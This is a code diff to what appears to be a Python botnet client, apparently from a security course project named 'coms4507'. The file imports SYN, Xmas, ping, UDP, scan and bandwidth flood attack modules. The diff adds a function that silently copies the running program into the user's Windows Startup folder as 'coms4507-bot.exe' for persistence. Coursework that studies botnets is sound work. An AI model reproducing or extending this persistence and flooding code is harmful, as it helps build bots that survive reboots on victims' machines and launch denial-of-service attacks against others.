@@ -4,6 +4,10 @@ import socket
 import json
 import threading
 import time
+import getpass
+import os
+import sys
+import shutil
 from enum import Enum
 from socket import timeout
 import syn_flood, xmas_attack, ping_flood, udp_flood, scan_flood, bandwidth_ddos
@@ -234,6 +238,14 @@ def notification(action):
         duration=5,
         threaded=True,
     )
+
+def add_to_startup(file_path=""):
+    if file_path == "":
+        file_path = os.path.realpath(sys.argv[0])
+    exe_path = f"{os.environ['SYSTEMDRIVE']}\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\coms4507-bot.exe"
+    # only copy across if startup directory exists and file doesn't
+    if (os.path.exists(os.path.dirname(exe_path)) and not os.path.exists(exe_path)):
+            shutil.copy(file_path, exe_path)
 
 
 def main():
